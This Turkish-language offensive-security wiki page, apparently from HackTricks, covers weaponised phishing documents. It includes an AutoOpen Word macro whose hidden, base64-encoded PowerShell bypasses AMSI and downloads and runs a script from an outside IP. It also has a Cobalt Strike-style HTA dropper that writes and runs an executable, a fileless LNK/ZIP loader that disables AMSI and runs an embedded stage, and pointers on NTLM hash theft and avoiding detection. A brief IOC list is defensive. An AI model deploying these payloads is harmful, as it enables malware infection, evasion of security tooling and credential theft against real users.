# Phishing Dosyaları ve Belgeler

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verisi doğrulaması gerçekleştirir. Veri doğrulaması, OfficeOpenXML standardına göre veri yapısı tanımlaması şeklinde yapılır. Veri yapı tanımlaması sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmayacaktır.

Makro içeren Word dosyaları genellikle `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve makro çalıştırma yeteneğini korumak mümkündür.\
Örneğin, bir RTF dosyası tasarım gereği makroları desteklemez, ancak DOCM uzantılı bir dosya RTF olarak yeniden adlandırılırsa Microsoft Word tarafından işlenir ve makro çalıştırabilir.\
Aynı iç yapılar ve mekanizmalar Microsoft Office Suite'in tüm yazılımları için geçerlidir (Excel, PowerPoint vb.).

Aşağıdaki komutu, bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX dosyaları makrolar içeren uzak bir şablona referans verdiğinde (File –Options –Add-ins –Manage: Templates –Go) makroları da “çalıştırabilir”.

### Harici Resim Yükleme

Git: _Insert --> Quick Parts --> Field_\
_**Kategoriler**: Links and References, **Alan adları**: includePicture, ve **Dosya adı veya URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Belgeden rastgele kod çalıştırmak için macros kullanılabilir.

#### Otomatik yükleme fonksiyonları

Ne kadar yaygınlarsa, AV tarafından tespit edilme olasılıkları o kadar artar.

- AutoOpen()
- Document_Open()

#### Macros Kod Örnekleri
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metaverileri elle kaldır

Git **File > Info > Inspect Document > Inspect Document**, bu Document Inspector'ı açacaktır. **Inspect**'e tıklayın ve ardından **Document Properties and Personal Information**'ın yanındaki **Remove All**'a tıklayın.

#### Doc Extension

Tamamlandığında, **Save as type** açılır menüsünü seçin, formatı **`.docx`**'den **Word 97-2003 `.doc`**'e değiştirin.\
Bunun nedeni, **you **can't save macro's inside a `.docx`** ve macro-enabled **`.docm`** uzantısı etrafında bir **stigma** olmasıdır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta ağ geçitleri bunları tamamen engeller). Bu nedenle, bu **legacy `.doc` extension is the best compromise**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA, HTML ile betik dillerini (ör. VBScript ve JScript) birleştiren bir Windows programıdır. Kullanıcı arayüzünü üretir ve bir tarayıcının güvenlik modeli kısıtlamaları olmadan "fully trusted" bir uygulama olarak çalıştırılır.

Bir HTA, genellikle **`mshta.exe`** kullanılarak çalıştırılır; bu genellikle **Internet Explorer** ile birlikte **installed** olur ve bu da **`mshta` dependant on IE** olmasını sağlar. Bu nedenle Internet Explorer kaldırıldıysa, HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Kimlik Doğrulamasını Zorlama

NTLM kimlik doğrulamasını **"uzaktan"** zorlamanın birkaç yolu vardır; örneğin, kullanıcının erişeceği e-postalara veya HTML'e **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbana, klasörü **açmak**la **tetiklenecek** **bir kimlik doğrulamasını** başlatacak **dosya adresleri** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Hash'i veya kimlik doğrulamayı çalmanın yanı sıra, ayrıca **NTLM relay attacks** gerçekleştirebileceğinizi unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Oldukça etkili kampanyalar, içinde iki meşru sahte belge (PDF/DOCX) ve kötü amaçlı bir .lnk bulunan bir ZIP gönderir. Hile şudur: gerçek PowerShell loader, ZIP'in ham baytlarının içinde benzersiz bir işaretçiden sonra saklanır ve .lnk bunu bellekte çıkarır ve tamamen çalıştırır.

. ln k tek satırlık PowerShell tarafından uygulanan tipik akış:

1) Orijinal ZIP'i yaygın yollar içinde bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve şu anki çalışma dizininin üst dizini.
2) ZIP baytlarını okuyun ve sabit kodlu bir işaretçi bulun (ör. xFIQCV). İşaretçiden sonraki her şey gömülü PowerShell payload'ıdır.
3) ZIP'i %ProgramData% içine kopyalayın, orada çıkarın ve meşru görünmesi için sahte .docx'i açın.
4) Mevcut işlem için AMSI'yi atlayın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Bir sonraki aşamadaki obfuskasyonu kaldırın (ör. tüm # karakterlerini silin) ve bellekte çalıştırın.

Gömülü aşamayı çıkarıp çalıştırmak için örnek PowerShell iskeleti:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Teslimat genellikle saygın PaaS alt alan adlarını (ör. *.herokuapp.com) kötüye kullanır ve payload'ları gate'leyebilir (IP/UA'ya göre zararsız ZIP'ler sunar).
- Bir sonraki aşama sık sık base64/XOR shellcode'u çözer ve disk izlerini en aza indirmek için Reflection.Emit + VirtualAlloc aracılığıyla çalıştırır.

Aynı zincirde kullanılan persistence
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verisinin sonuna eklenmiş ASCII marker string (ör. xFIQCV) içeren ZIP dosyaları.
- ZIP'i bulmak için üst/kullanıcı klasörlerini listeleyen ve bir aldatıcı doküman açan .lnk.
- AMSI'ye müdahale via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Uzun süre çalışan business thread'ler güvenilir PaaS domain'lerinde barındırılan linklerle sona erer.

## NTLM hash'lerini çalmak için Windows dosyaları

Şu sayfaya bakın: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Referanslar

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
